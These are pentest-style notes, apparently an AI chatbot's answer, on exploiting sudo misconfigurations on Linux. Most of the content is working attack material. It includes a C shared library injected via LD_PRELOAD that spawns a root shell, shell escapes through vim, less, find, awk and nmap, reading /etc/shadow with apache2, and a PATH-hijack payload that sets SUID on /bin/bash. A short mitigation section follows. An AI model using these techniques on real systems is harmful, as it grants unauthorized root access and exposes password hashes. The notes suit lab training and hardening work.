# **Advanced Sudo Privilege Escalation Techniques**  
*(Comprehensive Notes on Exploiting Sudo Misconfigurations)*  

---

## **1. Understanding Sudo Permissions**
### **Key Commands**  
| Command | Description |
|---------|-------------|
| `sudo -l` | List allowed (and forbidden) commands for the current user |
| `sudo -u <user> <command>` | Run a command as a different user |
| `sudo -k` | Invalidate cached credentials (force re-authentication) |

### **Current User’s Sudo Access (No Password)**
The user can run the following commands as **root** without a password:  
```bash
/usr/sbin/iftop      # Network traffic monitoring
/usr/bin/find        # File search utility
/usr/bin/nano        # Text editor
/usr/bin/vim         # Advanced text editor (shell escape possible)
/usr/bin/man         # Manual pages (can execute shell commands)
/usr/bin/awk         # Text processing (can run system commands)
/usr/bin/less        # File viewer (can execute shell commands)
/usr/bin/ftp         # File transfer protocol client
/usr/bin/nmap        # Network scanner (can read files with `--script`)
/usr/sbin/apache2    # Web server (can read files with `-f`)
/bin/more            # Basic file viewer (can execute shell commands)
```

### **Dangerous Environment Variables**
```bash
env_reset  
env_keep+=LD_PRELOAD    # Allows preloading shared libraries (Dangerous!)  
env_keep+=LD_LIBRARY_PATH # Allows custom library path manipulation  
```
→ These can be abused for **privilege escalation** via **code injection**.

---

## **2. Exploiting Sudo Misconfigurations**
### **A. LD_PRELOAD Hijacking (Dynamic Library Injection)**
1. **Create a malicious shared library (`hijack.c`)**  
   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>

   void _init() {
       unsetenv("LD_PRELOAD");  // Avoid infinite loops
       system("/bin/bash -p");  // Spawn a root shell (-p preserves privileges)
   }
   ```
2. **Compile it as a shared object (.so)**
   ```bash
   gcc -fPIC -shared -nostartfiles -o hijack.so hijack.c
   ```
3. **Execute with sudo and LD_PRELOAD**
   ```bash
   sudo LD_PRELOAD=/path/to/hijack.so vim
   ```
   → **Grants a root shell** if `LD_PRELOAD` is allowed.

---

### **B. Shell Escaping from Restricted Binaries**
#### **1. Vim / Nano / Less / More / Man**
- **Vim/Nano**:  
  ```bash
  sudo vim  
  :!sh  # Spawns a shell
  ```
- **Less/More/Man**:  
  ```bash
  sudo less /etc/shadow  
  !/bin/sh  # Escapes to shell
  ```

#### **2. Find Command Abuse**
```bash
sudo find / -exec /bin/sh \; -quit
```
→ Runs `/bin/sh` as root.

#### **3. Awk Command Execution**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
→ Executes `/bin/sh` as root.

#### **4. Nmap Privilege Escalation**
```bash
sudo nmap --interactive
nmap> !sh
```
→ Escalates to root shell if `nmap` is allowed.

#### **5. Apache2 File Disclosure**
```bash
sudo apache2 -f /etc/shadow
```
→ Displays the first line of `/etc/shadow` (useful for hash extraction).

---

### **C. Exploiting PATH Hijacking**
If a script is run with sudo and does not use absolute paths:  
1. **Find writable directories in PATH**  
   ```bash
   echo $PATH  
   ```
2. **Create a malicious binary with the same name**  
   ```bash
   echo 'chmod +s /bin/bash' > /tmp/fake_command  
   chmod +x /tmp/fake_command  
   export PATH=/tmp:$PATH  
   ```
3. **Run the sudo command**  
   → If it calls an unsafe binary, it executes our malicious version.

---

## **3. Mitigation & Best Practices**
### **How to Secure Sudo Configurations**
1. **Avoid `NOPASSWD`** – Require passwords for all sudo commands.  
2. **Use Full Paths** – Prevent PATH hijacking.  
3. **Restrict Dangerous Binaries** – Remove `vim`, `find`, `awk`, `nmap`, etc.  
4. **Disable `LD_PRELOAD` & `LD_LIBRARY_PATH`**  
   ```bash
   Defaults env_reset  
   Defaults !env_keep  
   ```
5. **Use `sudo -l` Auditing** – Regularly check for weak configurations.  

---

## **4. References**
- **[GTFOBins](https://gtfobins.github.io/)** – Exploitable binaries for privilege escalation.  
- **[Sudo Secure Coding](https://www.sudo.ws/)** – Official security guidelines.  

---

### **Final Notes**
- **Always check `sudo -l` after gaining initial access.**  
- **If `LD_PRELOAD` is allowed, root access is trivial.**  
- **Restricted shells can often be escaped via text editors/viewers.**  

🚀 **Next Steps**: Test these techniques in a controlled lab environment!  

---
Would you like additional details on any specific method? 😊
